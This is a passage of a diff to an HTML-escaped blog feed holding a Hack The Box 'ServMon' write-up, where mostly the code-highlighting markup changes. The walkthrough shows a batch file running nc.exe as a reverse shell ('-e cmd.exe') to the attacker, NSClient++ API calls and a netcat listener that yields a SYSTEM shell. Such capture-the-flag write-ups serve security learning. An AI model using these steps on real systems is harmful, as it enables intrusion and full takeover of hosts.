   &lt;li&gt;Write the following lines into &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;exploit.bat&lt;/code&gt;:
-    &lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;@echo off
-C:&lt;span class=&quot;se&quot;&gt;\T&lt;/span&gt;emp&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;c.exe your_ip port &lt;span class=&quot;nt&quot;&gt;-e&lt;/span&gt; cmd.exe
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
+    &lt;div class=&quot;language-console highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;go&quot;&gt;@echo off
+C:\Temp\nc.exe your_ip port -e cmd.exe
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
   &lt;/li&gt;
   &lt;li&gt;Upload nc.exe and your &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;exploit.bat&lt;/code&gt; to C:\Temp via scp: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;scp nc.exe nadine@10.10.10.184:&quot;C:\Temp&quot;&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;scp exploit.bat nadine@10.10.10.184:&quot;C:\Temp&quot;&lt;/code&gt;.&lt;/li&gt;
   &lt;li&gt;Run &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nc -lnvp port&lt;/code&gt; with the port specified in the script.&lt;/li&gt;
@@ -1352,34 +1491,34 @@ C:&lt;span class=&quot;se&quot;&gt;\T&lt;/span&gt;emp&lt;span class=&quot;se&quo
   &lt;li&gt;Access the api:&lt;/li&gt;
 &lt;/ol&gt;
 
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nadine@SERVMON C:&lt;span class=&quot;se&quot;&gt;\P&lt;/span&gt;rogram Files&lt;span class=&quot;se&quot;&gt;\N&lt;/span&gt;SClient++&amp;gt;curl &lt;span class=&quot;nt&quot;&gt;-k&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; admin https://localhost:8443/api/v1/mod
-ules
-nter host password &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;user &lt;span class=&quot;s1&quot;&gt;'admin'&lt;/span&gt;:
+&lt;div class=&quot;language-console highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gp&quot;&gt;nadine@SERVMON C:\Program Files\NSClient++&amp;gt;&lt;/span&gt;curl &lt;span class=&quot;nt&quot;&gt;-k&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; admin https://localhost:8443/api/v1/mod
+&lt;span class=&quot;go&quot;&gt;ules
+nter host password for user 'admin':
 HTTP/1.1 200
 Content-Length: 2299
-Set-cookie: &lt;span class=&quot;nv&quot;&gt;token&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;yapnxrpMCARCr4zdGc81tBDKsMlaZTXC&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;path&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/
-Set-cookie: &lt;span class=&quot;nv&quot;&gt;uid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;admin&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;path&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/
-
-&lt;span class=&quot;o&quot;&gt;[{&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;description&quot;&lt;/span&gt;:&lt;span class=&quot;s2&quot;&gt;&quot;Module used to execute external scripts&quot;&lt;/span&gt;,&lt;span class=&quot;s2&quot;&gt;&quot;id&quot;&lt;/span&gt;:&lt;span class=&quot;s2&quot;&gt;&quot;CheckExternalScripts&quot;&lt;/span&gt;,&lt;span class=&quot;s2&quot;&gt;&quot;load_url&quot;&lt;/span&gt;
-:&lt;span class=&quot;s2&quot;&gt;&quot;https://localhost:8443/api/v1/modules/CheckExternalScripts/commands/load&quot;&lt;/span&gt;,&lt;span class=&quot;s2&quot;&gt;&quot;loaded&quot;&lt;/span&gt;:true,&lt;span class=&quot;s2&quot;&gt;&quot;metad
-ata&quot;&lt;/span&gt;:&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;alias&quot;&lt;/span&gt;:&lt;span class=&quot;s2&quot;&gt;&quot;&quot;&lt;/span&gt;,&lt;span class=&quot;s2&quot;&gt;&quot;plugin_id&quot;&lt;/span&gt;:&lt;span class=&quot;s2&quot;&gt;&quot;0&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;,&lt;span class=&quot;s2&quot;&gt;&quot;module_url&quot;&lt;/span&gt;:&lt;span class=&quot;s2&quot;&gt;&quot;https://localhost:8443/api/v1/modules/CheckExter
-nalScripts/&quot;&lt;/span&gt;,&lt;span class=&quot;s2&quot;&gt;&quot;name&quot;&lt;/span&gt;:&lt;span class=&quot;s2&quot;&gt;&quot;CheckExternalScripts&quot;&lt;/span&gt;,&lt;span class=&quot;s2&quot;&gt;&quot;title&quot;&lt;/span&gt;:&lt;span class=&quot;s2&quot;&gt;&quot;CheckExternalScripts&quot;&lt;/span&gt;,&lt;span class=&quot;s2&quot;&gt;&quot;unload_url&quot;&lt;/span&gt;:&lt;span class=&quot;s2&quot;&gt;&quot;https://
-localhost:8443/api/v1/modules/CheckExternalScripts/commands/unload&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;Set-cookie: token=yapnxrpMCARCr4zdGc81tBDKsMlaZTXC;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;path&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/
+&lt;span class=&quot;gp&quot;&gt;Set-cookie: uid=admin;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;path&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/
+&lt;span class=&quot;go&quot;&gt;
+[{&quot;description&quot;:&quot;Module used to execute external scripts&quot;,&quot;id&quot;:&quot;CheckExternalScripts&quot;,&quot;load_url&quot;
+:&quot;https://localhost:8443/api/v1/modules/CheckExternalScripts/commands/load&quot;,&quot;loaded&quot;:true,&quot;metad
+ata&quot;:{&quot;alias&quot;:&quot;&quot;,&quot;plugin_id&quot;:&quot;0&quot;},&quot;module_url&quot;:&quot;https://localhost:8443/api/v1/modules/CheckExter
+nalScripts/&quot;,&quot;name&quot;:&quot;CheckExternalScripts&quot;,&quot;title&quot;:&quot;CheckExternalScripts&quot;,&quot;unload_url&quot;:&quot;https://
+localhost:8443/api/v1/modules/CheckExternalScripts/commands/unload&quot;}
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 &lt;p&gt;It shows us that we can load and unload external scripts via the specified &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;_url&lt;/code&gt;.
 Doing &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;curl -k -i -u admin https://localhost:8443/api/v1/mod
 ules/CheckExternalScripts/commands/unload&lt;/code&gt; should result in  a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Success unload CheckExternalScripts&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;curl -k -i -u admin https://localhost:8443/api/v1/mod
 ules/CheckExternalScripts/commands/load&lt;/code&gt; in a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Success load CheckExternalScripts&lt;/code&gt;respectively.&lt;/p&gt;
 
 &lt;p&gt;If we now enter &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;exploit&lt;/code&gt; in the Console of the web interface we receive our reverse shell as Administrator:&lt;/p&gt;
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;nc &lt;span class=&quot;nt&quot;&gt;-lnvp&lt;/span&gt; 443
-&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; password &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;kali: 
-listening on &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;any] 443 ...
-connect to &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;10.10.14.23] from &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;UNKNOWN&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;10.10.10.184] 50611
-Microsoft Windows &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Version 10.0.18363.752]
-&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;c&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; 2019 Microsoft Corporation. All rights reserved.
+&lt;div class=&quot;language-console highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gp&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;nc &lt;span class=&quot;nt&quot;&gt;-lnvp&lt;/span&gt; 443
+&lt;span class=&quot;go&quot;&gt;[sudo] password for kali: 
+listening on [any] 443 ...
+connect to [10.10.14.23] from (UNKNOWN) [10.10.10.184] 50611
+Microsoft Windows [Version 10.0.18363.752]
+(c) 2019 Microsoft Corporation. All rights reserved.
 
-C:&lt;span class=&quot;se&quot;&gt;\P&lt;/span&gt;rogram Files&lt;span class=&quot;se&quot;&gt;\N&lt;/span&gt;SClient++&amp;gt;whoami
-&lt;span class=&quot;nb&quot;&gt;whoami
-&lt;/span&gt;nt authority&lt;span class=&quot;se&quot;&gt;\s&lt;/span&gt;ystem
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;</content><author><name>Philipp Menner</name></author><category term="boxes" /><category term="boxes" /><category term="windows" /><summary type="html">Write-up of the box ServMon from Hack The Box</summary></entry></feed>
+&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;C:\Program Files\NSClient++&amp;gt;&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;whoami&lt;/span&gt;
+&lt;span class=&quot;go&quot;&gt;whoami
+nt authority\system
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;</content><author><name>Philipp Menner</name></author><category term="boxes" /><category term="boxes" /><category term="windows" /><summary type="html">Write-up of the box ServMon from Hack The Box</summary></entry></feed>
